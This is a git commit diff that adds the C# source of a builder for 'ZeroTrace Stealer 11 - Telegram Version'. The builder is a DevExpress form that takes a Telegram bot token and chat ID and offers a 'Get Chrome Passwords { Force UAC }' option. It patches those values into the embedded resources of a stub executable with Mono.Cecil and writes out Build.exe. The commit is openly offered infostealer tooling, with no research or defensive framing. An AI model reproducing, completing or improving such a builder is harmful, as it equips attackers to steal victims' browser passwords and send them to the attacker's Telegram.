fcb3e99d21b954c96222d0eb6f70a9396b0148b4
Clever <luis22dubuquexvx@hotmail.com>
2025-05-13 22:02:50 +0300

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,141 @@
+﻿namespace ZeroTraceStealer11Telegram
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.groupControl1 = new DevExpress.XtraEditors.GroupControl();
+            this.simpleButton1 = new DevExpress.XtraEditors.SimpleButton();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textEdit2 = new DevExpress.XtraEditors.TextEdit();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textEdit1 = new DevExpress.XtraEditors.TextEdit();
+            this.checkEdit1 = new DevExpress.XtraEditors.CheckEdit();
+            ((System.ComponentModel.ISupportInitialize)(this.groupControl1)).BeginInit();
+            this.groupControl1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.textEdit2.Properties)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.textEdit1.Properties)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.checkEdit1.Properties)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // groupControl1
+            // 
+            this.groupControl1.Controls.Add(this.checkEdit1);
+            this.groupControl1.Controls.Add(this.simpleButton1);
+            this.groupControl1.Controls.Add(this.label2);
+            this.groupControl1.Controls.Add(this.textEdit2);
+            this.groupControl1.Controls.Add(this.label1);
+            this.groupControl1.Controls.Add(this.textEdit1);
+            this.groupControl1.Location = new System.Drawing.Point(12, 12);
+            this.groupControl1.Name = "groupControl1";
+            this.groupControl1.Size = new System.Drawing.Size(522, 217);
+            this.groupControl1.TabIndex = 0;
+            this.groupControl1.Text = "Main";
+            // 
+            // simpleButton1
+            // 
+            this.simpleButton1.Location = new System.Drawing.Point(27, 174);
+            this.simpleButton1.Name = "simpleButton1";
+            this.simpleButton1.Size = new System.Drawing.Size(469, 30);
+            this.simpleButton1.TabIndex = 4;
+            this.simpleButton1.Text = "{ Build }";
+            this.simpleButton1.Click += new System.EventHandler(this.simpleButton1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(24, 99);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(44, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Chat ID";
+            // 
+            // textEdit2
+            // 
+            this.textEdit2.Location = new System.Drawing.Point(27, 118);
+            this.textEdit2.Name = "textEdit2";
+            this.textEdit2.Size = new System.Drawing.Size(469, 20);
+            this.textEdit2.TabIndex = 2;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(24, 45);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(55, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Bot Token";
+            // 
+            // textEdit1
+            // 
+            this.textEdit1.Location = new System.Drawing.Point(27, 64);
+            this.textEdit1.Name = "textEdit1";
+            this.textEdit1.Size = new System.Drawing.Size(469, 20);
+            this.textEdit1.TabIndex = 0;
+            // 
+            // checkEdit1
+            // 
+            this.checkEdit1.Location = new System.Drawing.Point(27, 145);
+            this.checkEdit1.Name = "checkEdit1";
+            this.checkEdit1.Properties.Caption = "Get Chrome Passwords { Force UAC }";
+            this.checkEdit1.Size = new System.Drawing.Size(209, 20);
+            this.checkEdit1.TabIndex = 5;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(546, 246);
+            this.Controls.Add(this.groupControl1);
+            this.IconOptions.Image = global::ZeroTraceStealer11Telegram.Properties.Resources.Copy_of_Untitled_Design__3_;
+            this.MaximumSize = new System.Drawing.Size(546, 276);
+            this.MinimumSize = new System.Drawing.Size(546, 276);
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "ZeroTrace Stealer 11 - Telegram Version";
+            ((System.ComponentModel.ISupportInitialize)(this.groupControl1)).EndInit();
+            this.groupControl1.ResumeLayout(false);
+            this.groupControl1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.textEdit2.Properties)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.textEdit1.Properties)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.checkEdit1.Properties)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private DevExpress.XtraEditors.GroupControl groupControl1;
+        private DevExpress.XtraEditors.TextEdit textEdit1;
+        private DevExpress.XtraEditors.SimpleButton simpleButton1;
+        private System.Windows.Forms.Label label2;
+        private DevExpress.XtraEditors.TextEdit textEdit2;
+        private System.Windows.Forms.Label label1;
+        private DevExpress.XtraEditors.CheckEdit checkEdit1;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,162 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using DevExpress.XtraEditors;
+using Mono.Cecil;
+
+namespace ZeroTraceStealer11Telegram
+{
+    public partial class Form1 : DevExpress.XtraEditors.XtraForm
+    {
+        public Form1()
+        {
+            InitializeComponent();
+
+        }
+
+        private void simpleButton1_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(textEdit1.Text) || string.IsNullOrWhiteSpace(textEdit2.Text))
+            {
+              
+                MessageBox.Show("Bot token and chat ID cannot be empty.", "Validation Error",
+                                MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return; 
+            }
+
+          
+            string botToken = textEdit1.Text;
+            string chatId = textEdit2.Text;
+
+
+            string chrome = "0";
+            if (checkEdit1.Checked)
+            {
+                chrome = "1";
+              
+            }
+            else
+            {
+     
+            }
+
+            string outputpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Build.exe";
+
+            ZeroTrace.Builder.Build.ModifyAndSaveAssembly(botToken, chatId, chrome, outputpath);
+
+
+            MessageBox.Show("Build Success!");
+
+
+        }
+    }
+}
+
+
+namespace ZeroTrace.Builder
+{
+
+
+    internal sealed class Build
+    {
+
+
+
+        private static AssemblyDefinition ReadStub(string stubPath)
+        {
+            if (!File.Exists(stubPath))
+                throw new FileNotFoundException("Stub file not found.", stubPath);
+
+            return AssemblyDefinition.ReadAssembly(stubPath);
+        }
+
+        private static void WriteStub(AssemblyDefinition definition, string outputPath)
+        {
+            definition.Write(outputPath);
+        }
+
+
+
+
+
+        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
+        {
+            // Find the existing resource by name
+            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
+                                    .FirstOrDefault(r => r.Name.Equals(resourceName));
+
+            if (existingResource != null)
+            {
+                // Remove the existing resource
+                assembly.MainModule.Resources.Remove(existingResource);
+            }
+
+            // Add the new resource
+            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
+            assembly.MainModule.Resources.Add(newResource);
+        }
+
+        public static void UpdateIPAndPort(string newIP, string newPort, string chrome, AssemblyDefinition assembly)
+        {
+            // Remove and add the IP and Port resources
+            UpdateResource("ZeroTraceOfficialStub.Resources.ip.txt", newIP, assembly);
+            UpdateResource("ZeroTraceOfficialStub.Resources.port.txt", newPort, assembly);
+
+            UpdateResource("ZeroTraceOfficialStub.Resources.uac.txt", chrome, assembly);
+
+
+        }
+
+
+        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
+        //{
+        //    try
+        //    {
+        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";
+
+        //        Console.WriteLine(stubPath);
+        //        Console.ReadLine();
+        //        // Read the stub assembly
+        //        var assembly = ReadStub(stubPath);
+
+        //        // Update the IP and Port resources
+        //        UpdateIPAndPort(newIP, newPort, assembly);
+
+        //        // Write the modified assembly to a file
+        //        WriteStub(assembly, outputPath);
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
+        //    }
+        //}
+
+
+        public static void ModifyAndSaveAssembly(string newIP, string newPort, string chrome, string outputPath)
+        {
+            try
+            {
+                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
+                Console.WriteLine(stubPath);
+                Console.ReadLine();
+                // Read the stub assembly
+                var assembly = ReadStub(stubPath);
+                // Update the IP, Port and injection setting resources
+                UpdateIPAndPort(newIP, newPort, chrome, assembly);
+                // Write the modified assembly to a file
+                WriteStub(assembly, outputPath);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"Failed to modify assembly: {ex.Message}");
+            }
+        }
+    }
+
+}
